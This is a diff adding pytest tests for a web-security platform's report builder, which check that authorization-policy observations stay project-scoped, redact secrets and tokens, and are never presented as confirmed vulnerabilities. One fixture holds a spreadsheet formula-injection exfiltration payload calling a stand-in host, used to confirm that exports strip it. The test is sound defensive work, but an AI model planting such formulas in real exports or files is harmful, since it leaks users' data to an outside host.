@@ -214,3 +214,144 @@ def test_wstg_coverage_http_is_project_scoped_and_never_exposes_verdict_authorit
         if client.portal is not None:
             client.portal.call(sync_to_async(connections.close_all, thread_sensitive=True))
         app.dependency_overrides.clear()
+
+
+@pytest.mark.django_db
+def test_full_project_report_exposes_only_bounded_authorization_observation_lineage(
+    monkeypatch, settings, tmp_path,
+):
+    """G3 mismatch evidence is not a finding or independently verified exploit."""
+    import hashlib
+    import json
+
+    from enterprise.web_security_models import WebSecurityObservation, WebSecurityValidationRun
+    from fastapi_app.routers import reports as report_module
+    from fastapi_app.routers.reports import _make_pdf
+
+    owner, outsider, project, scan = _fixture_project()
+    foreign_project = Project.objects.create(
+        name='Other Tenant Report', slug='other-tenant-report', owner=outsider,
+    )
+    local_run = WebSecurityValidationRun.objects.create(
+        project=project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
+        status=WebSecurityValidationRun.Status.COMPLETED,
+        input_sha256='a' * 64, summary={'total': 2, 'passed': 1, 'failed': 1},
+        created_by=owner,
+    )
+    remote_run = WebSecurityValidationRun.objects.create(
+        project=foreign_project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
+        status=WebSecurityValidationRun.Status.COMPLETED,
+        input_sha256='b' * 64, summary={'total': 1, 'passed': 0, 'failed': 1},
+        created_by=outsider,
+    )
+
+    def observe(run, case_ref, allowed, decision, passed, raw_secret):
+        return WebSecurityObservation.objects.create(
+            run=run, case_ref=case_ref, identity_ref='private-identity',
+            identity_type='user', role='viewer', tenant_ref='private-tenant',
+            resource_ref='private-resource', resource_tenant_ref='other-tenant',
+            endpoint='/vulnerable/records/private-record',
+            method='GET', operation='read', expected_allowed=allowed,
+            observed_decision=decision, passed=passed,
+            semantic={'private_raw': raw_secret, 'Authorization': 'Bearer do-not-export'},
+            evidence_fingerprint='c' * 64,
+        )
+
+    observed_bad = observe(
+        local_run, '=IMPORTDATA("https://exfil.invalid")',
+        False, WebSecurityObservation.Decision.ALLOWED, False, 'secret-on-project',
+    )
+    observed_fixed = observe(
+        local_run, 'fixed-differential', False,
+        WebSecurityObservation.Decision.DENIED, True, 'private-response',
+    )
+    foreign = observe(
+        remote_run, 'foreign-observation', False,
+        WebSecurityObservation.Decision.ALLOWED, False, 'other-project-secret',
+    )
+
+    full = async_to_sync(_build_payload)(str(project.id), None, 'full')
+    projection = full['authorization_observations']
+    assert projection['schema'] == 'aegis.authorization-observation-report.v1'
+    assert projection['claim_policy'] == 'observation-only'
+    assert projection['finding_confirmation'] == 'not_established_by_observation'
+    assert projection['independent_verification'] is False
+    assert projection['total'] == projection['included'] == 2
+    assert projection['policy_mismatch_total'] == 1
+    assert projection['truncated'] is False
+    assert {item['observation_id'] for item in projection['items']} == {
+        str(observed_bad.pk), str(observed_fixed.pk),
+    }
+    assert all(item['run_id'] == str(local_run.pk) for item in projection['items'])
+    assert all(item['observation_fingerprint'] == 'c' * 64 for item in projection['items'])
+    assert str(foreign.pk) not in json.dumps(full)
+    for secret in ('secret-on-project', 'private-response', 'other-project-secret',
+                   'Bearer do-not-export', 'private-tenant', '/vulnerable/records/private-record',
+                   '=IMPORTDATA'):
+        assert secret not in json.dumps(full, sort_keys=True)
+        assert secret not in _make_csv(full).decode('utf-8')
+
+    csv_text = _make_csv(full).decode('utf-8')
+    assert 'authorization_observation_summary,observation-only,2,1,2,False' in csv_text
+    assert 'authorization_observation' in csv_text
+    assert b'Authorization policy observations (not confirmed vulnerabilities)' in _make_pdf(
+        full, 'G3 Authorized Observations',
+    )
+
+    settings.MEDIA_ROOT = tmp_path
+    report = async_to_sync(_create_report)(
+        ReportCreate(project_id=str(project.pk), title='G3 Policy Observations',
+                     report_type='full', format='json'),
+        str(owner.pk), full,
+    )
+    assert report.status == DataExport.Status.COMPLETED
+    assert 'authorization_observations' in report.fields
+    assert report.record_count == (
+        len(full.get('findings', [])) + len(full.get('evidence', []))
+        + len(full['wstg_coverage']['tests']) + 2
+    )
+    report.file.open('rb')
+    try:
+        artifact = report.file.read()
+    finally:
+        report.file.close()
+    assert hashlib.sha256(artifact).hexdigest() == report.artifact_sha256
+    assert len(json.loads(artifact)['authorization_observations']['items']) == 2
+
+    # Validation runs are NOT Scan FK records; never contaminate an individual scan.
+    scoped = async_to_sync(_build_payload)(str(project.pk), str(scan.pk), 'full')
+    assert 'authorization_observations' not in scoped
+    separate = async_to_sync(_build_payload)(str(project.pk), None, 'wstg')
+    assert 'authorization_observations' not in separate
+
+    # The projection has an explicit row budget; totals must not silently shrink.
+    monkeypatch.setattr(report_module, '_MAX_AUTHORIZATION_OBSERVATIONS_IN_REPORT', 1)
+    bounded = async_to_sync(_build_payload)(str(project.pk), None, 'full')
+    assert bounded['authorization_observations']['total'] == 2
+    assert bounded['authorization_observations']['included'] == 1
+    assert bounded['authorization_observations']['truncated'] is True
+
+
+@pytest.mark.django_db
+def test_unqualified_authorization_run_does_not_claim_verified_finding():
+    from enterprise.web_security_models import WebSecurityObservation, WebSecurityValidationRun
+
+    owner, _, project, _ = _fixture_project()
+    invalid_run = WebSecurityValidationRun.objects.create(
+        project=project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
+        status=WebSecurityValidationRun.Status.FAILED, input_sha256='d' * 64,
+        summary={'total': 1, 'passed': 0, 'failed': 1}, created_by=owner,
+    )
+    WebSecurityObservation.objects.create(
+        run=invalid_run, case_ref='indeterminate-case', identity_ref='test',
+        identity_type='user', resource_ref='record', endpoint='/record',
+        method='GET', expected_allowed=False, observed_decision='error',
+        passed=False, evidence_fingerprint='malformed',
+    )
+    payload = async_to_sync(_build_payload)(str(project.pk), None, 'full')
+    projection = payload['authorization_observations']
+    assert projection['total'] == 1 and projection['policy_mismatch_total'] == 0
+    assert projection['independent_verification'] is False
+    assert projection['items'][0]['run_status'] == 'failed'
+    assert projection['items'][0]['observation_fingerprint'] is None
+    assert 'confirmed' not in {item['observed_decision'] for item in projection['items']}
